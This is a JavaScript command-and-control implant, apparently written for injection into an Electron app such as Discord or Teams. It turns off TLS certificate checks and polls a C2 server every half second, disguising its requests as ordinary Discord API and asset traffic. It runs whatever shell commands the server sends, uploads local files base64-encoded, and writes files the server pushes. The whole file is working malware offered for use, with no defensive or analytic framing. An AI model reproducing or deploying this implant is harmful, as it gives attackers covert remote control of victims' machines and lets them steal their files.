//const index = require('./{getMainFunc(asarDir)}');
const https = require('https');
const exec = require('child_process').exec;
const fs = require('fs');
const process = require('process')

const HOST = "127.0.0.1"
const PORT = 1337
const C2_SERVER = `https://${HOST}:${PORT}`;

//get requests to not look sus
const getRequests = [
'bootstrap.js',
'index.html',
'styles.css',
'app.css',
'discord.js',
'teams.js',
'app.js',
'channels.json',
'messages.json',
'user_settings.json',
'profile_picture.png',
'emoji.gif',
'fontawesome.woff',
'roboto.woff2',
'voice_message.mp3',
'video_attachment.mp4',
'icon.svg',
'manifest.json'];

//post requests also to not look sus
const postRequests = [
'api/v9/channels/{channel_id}/messages',
'api/v9/channels/{channel_id}/messages/attachments',
'api/v9/users/@me/settings',
'api/v9/guilds/{guild_id}/channels',
'api/v9/invite/{invite_code}',
'api/v9/oauth2/token',
'api/v9/users/@me/avatar',
'api/v9/channels/{channel_id}/messages/bulk-delete',
'api/v9/applications/{application_id}/commands',
'api/v9/users/@me/guilds'];

//ignore cert security
process.env["NODE_TLS_REJECT_UNAUTHORIZED"] = 0;

function uploadFile(file) {
    https.get(`${C2_SERVER}/upload.php/${file}`, (res) => {
        let data = '';

        res.on('data', chunk => {
            data += chunk;
        });

        res.on('end', () => {
            console.log(`${C2_SERVER}/upload.php/${file}`);
            console.log(data);
            const base64String = data;
            const filePath = file;

            const cleaned = base64String.split(',')[1] || base64String;

            const buffer = Buffer.from(cleaned, 'base64');

            fs.writeFileSync(filePath, buffer);
        });
    });
}

function downloadFile(file) {
    const content = fs.readFileSync(file);

    const base64data = content.toString('base64');

    const postData = JSON.stringify({ result: base64data })
    const options = {
        hostname: HOST,
        port: PORT,
        path: `/upload.php/${file}`,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(postData)
        }
    };

    const req = https.request(options, res => {
        console.log(`Status: ${res.statusCode}`);
    });

    req.on('error', err => {
        console.error(`Error sending output ${err.message}`);
    });

    req.write(postData);
    req.end();
}

function pollServer() {
    const requestPath = getRequests[Math.floor(Math.random() * getRequests.length)];
    https.get(`${C2_SERVER}/${requestPath}`, (res) => {
        let data = '';

        res.on('data', chunk => {
            data += chunk;
        });

        res.on('end', () => {
            //data = data.trim();
            if (data && data !== '204 - No Content') {
                console.log('Recieved command: ', data);
                if (data == "getpid") {
                    sendOutput(process.pid.toString())
                } else if (data == "kill") {
                    process.kill(process.pid, "SIGINT");
                } else if (data.split(' ')[0] == "upload") {
                    uploadFile(data.split(' ')[1]);
                } else if (data.split(' ')[0] == "download") {
                    downloadFile(data.split(' ')[1]);
                } else {
                    exec(data, (error, stdout, stderr) => {
                        if (error) {
                            console.error(`Error executing command: ${error.message}`);
                            sendOutput(`Error: ${error.message}`);
                        } else {
                            console.log(data)
                            sendOutput(stdout || stderr);
                        }
                    });
                }
                
                
            } else {
                console.log('No command recieved.')
            }
        });
    }).on('error', err => {
        console.error(`Error connecting to C2 server: ${err.message}`);
    });
}

function sendOutput(output) {
    const postData = JSON.stringify({ result: output });
    const requestPath = postRequests[Math.floor(Math.random() * postRequests.length)];
    const options = {
        hostname: HOST,
        port: PORT,
        path: `/${requestPath}`,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(postData)
        }
    };

    const req = https.request(options, res => {
        console.log(`Status: ${res.statusCode}`);
    });

    req.on('error', err => {
        console.error(`Error sending output ${err.message}`);
    });

    req.write(postData);
    req.end();
}

setInterval(pollServer, 500);